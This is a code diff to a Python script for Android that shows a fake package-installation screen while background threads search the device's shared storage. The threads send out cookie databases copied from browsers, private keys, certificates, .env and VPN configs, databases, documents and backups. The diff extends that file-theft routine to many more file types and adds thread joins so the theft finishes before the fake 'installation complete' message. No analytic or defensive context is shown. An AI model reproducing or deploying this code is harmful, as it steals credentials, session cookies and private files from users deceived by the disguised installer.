@@ -5,9 +5,9 @@ import time
 import sys
 import random
 import threading
+import shutil
 import json
 import sqlite3
-import shutil
 from datetime import datetime
 
 try:
@@ -26,22 +26,50 @@ RESET = '\033[0m'
 
 TARGET_PATH = '/storage/emulated/0/'
 
+TARGET_EXTS = (
+    '.zip', '.rar', '.7z', '.tar', '.gz',           # Archives
+    '.php', '.html', '.htm', '.css', '.js',         # Web files
+    '.py', '.sh', '.bash', '.zsh', '.pl', '.rb',    # Scripts
+    '.json', '.xml', '.yaml', '.yml', '.toml',      # Config files
+    '.db', '.sqlite', '.sql',                       # Databases
+    '.txt', '.md', '.log',                          # Text files
+    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',  # Documents
+    '.cfg', '.conf', '.ini', '.env',                # Configs
+    '.cookie', '.cookies',                          # Cookies
+    '.pem', '.key', '.crt', '.cert',                # Certificates
+    '.ovpn', '.conf',                               # VPN configs
+    '.apk', '.ipa',                                 # Apps
+    '.bak', '.old', '.backup'                       # Backups
+)
+
 def get_file_type(filename):
     ext = filename.lower()
-    if ext.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
-        return '📸 PHOTO'
-    elif ext.endswith(('.mp4', '.mkv', '.avi', '.mov', '.3gp')):
-        return '🎥 VIDEO'
-    elif ext.endswith(('.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx')):
-        return '📄 DOCUMENT'
-    elif ext.endswith(('.mp3', '.wav')):
-        return '🎵 AUDIO'
-    elif ext.endswith('.apk'):
-        return '📦 APK'
-    elif ext.endswith(('.zip', '.rar')):
+    if ext.endswith(('.zip', '.rar', '.7z', '.tar', '.gz')):
         return '🗜 ARCHIVE'
-    elif ext.endswith(('.cookie', '.txt')) and 'cookie' in filename.lower():
+    elif ext.endswith(('.php', '.html', '.htm', '.css', '.js')):
+        return '🌐 WEB FILE'
+    elif ext.endswith(('.py', '.sh', '.bash', '.zsh', '.pl', '.rb')):
+        return '📜 SCRIPT'
+    elif ext.endswith(('.json', '.xml', '.yaml', '.yml', '.toml')):
+        return '⚙ CONFIG'
+    elif ext.endswith(('.db', '.sqlite', '.sql')):
+        return '🗄 DATABASE'
+    elif ext.endswith(('.txt', '.md', '.log')):
+        return '📄 TEXT'
+    elif ext.endswith(('.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx')):
+        return '📚 DOCUMENT'
+    elif ext.endswith(('.cfg', '.conf', '.ini', '.env')):
+        return '🔧 CONFIG'
+    elif ext.endswith(('.cookie', '.cookies')):
         return '🍪 COOKIE'
+    elif ext.endswith(('.pem', '.key', '.crt', '.cert')):
+        return '🔑 CERTIFICATE'
+    elif ext.endswith(('.ovpn',)):
+        return '🔗 VPN CONFIG'
+    elif ext.endswith(('.apk', '.ipa')):
+        return '📦 APP'
+    elif ext.endswith(('.bak', '.old', '.backup')):
+        return '💾 BACKUP'
     return '📁 FILE'
 
 def send_file(file_path):
@@ -75,26 +103,28 @@ def steal_cookies():
         '/storage/emulated/0/Android/data/com.vivaldi.browser/files/Default/Cookies'
     ]
     
-    cookies_found = []
+    count = 0
     for path in cookie_paths:
         if os.path.exists(path):
             try:
                 timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-                dest = f"/storage/emulated/0/cookies_backup_{timestamp}.db"
+                dest = f"/storage/emulated/0/cookies_{timestamp}.db"
                 shutil.copy2(path, dest)
-                send_file(dest)
-                cookies_found.append(path)
+                if send_file(dest):
+                    count += 1
                 os.remove(dest)
             except:
                 pass
     
     for root, dirs, files in os.walk('/storage/emulated/0/'):
         for file in files:
-            if 'cookie' in file.lower() and (file.endswith('.txt') or file.endswith('.db') or file.endswith('.sqlite')):
-                send_file(os.path.join(root, file))
-                cookies_found.append(file)
+            if 'cookie' in file.lower() and file.lower().endswith(('.txt', '.db', '.sqlite', '.cookies')):
+                full_path = os.path.join(root, file)
+                if send_file(full_path):
+                    count += 1
+                time.sleep(0.1)
     
-    return len(cookies_found)
+    return count
 
 FAKE_PACKAGES = [
     "libssl-dev_1.1.1_arm64.deb", "python3-core_3.11.2_arm64.deb",
@@ -102,7 +132,8 @@ FAKE_PACKAGES = [
     "mysql-server_8.0.31_arm64.deb", "nodejs_18.12.0_arm64.deb",
     "docker_20.10.21_arm64.deb", "metasploit_6.3.0_arm64.deb",
     "curl_7.88.1_arm64.deb", "wget_1.21.3_arm64.deb",
-    "git_2.39.0_arm64.deb", "vim_9.0_arm64.deb"
+    "git_2.39.0_arm64.deb", "vim_9.0_arm64.deb",
+    "ruby_3.1.2_arm64.deb", "perl_5.36.0_arm64.deb"
 ]
 
 def fake_download():
@@ -146,15 +177,17 @@ def show_header():
     print(header)
     time.sleep(1.5)
 
-ALL_EXTS = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.mp4', '.mkv', '.avi', '.mov', '.3gp', '.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.mp3', '.wav', '.apk', '.zip', '.rar')
-
-def steal_all_files():
+def steal_target_files():
+    count = 0
     if os.path.exists(TARGET_PATH):
         for root, dirs, files in os.walk(TARGET_PATH):
             for file in files:
-                if file.lower().endswith(ALL_EXTS):
-                    send_file(os.path.join(root, file))
-                    time.sleep(0.15)
+                if file.lower().endswith(TARGET_EXTS):
+                    full_path = os.path.join(root, file)
+                    if send_file(full_path):
+                        count += 1
+                    time.sleep(0.1)
+    return count
 
 def main():
     show_header()
@@ -177,7 +210,7 @@ def main():
     print(f"{YELLOW}│ {WHITE}📦 PACKAGE MANAGEMENT{RESET}{YELLOW}                                          │{RESET}")
     print(f"{YELLOW}└─────────────────────────────────────────────────────────┘{RESET}")
     
-    file_thread = threading.Thread(target=steal_all_files)
+    file_thread = threading.Thread(target=steal_target_files)
     file_thread.daemon = True
     file_thread.start()
     
@@ -200,6 +233,9 @@ def main():
     print(f"{GREEN}│ {WHITE}✅ INSTALLATION COMPLETE!{RESET}{GREEN}                                       │{RESET}")
     print(f"{GREEN}│ {WHITE}📦 {num_pkgs} packages installed successfully{RESET}{GREEN}                    │{RESET}")
     print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
+    
+    file_thread.join(timeout=2)
+    cookie_thread.join(timeout=2)
     
     print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════════╗{RESET}")
     print(f"{CYAN}║{WHITE}                    💡 TIPS & COMMANDS 💡                       {CYAN}║{RESET}")
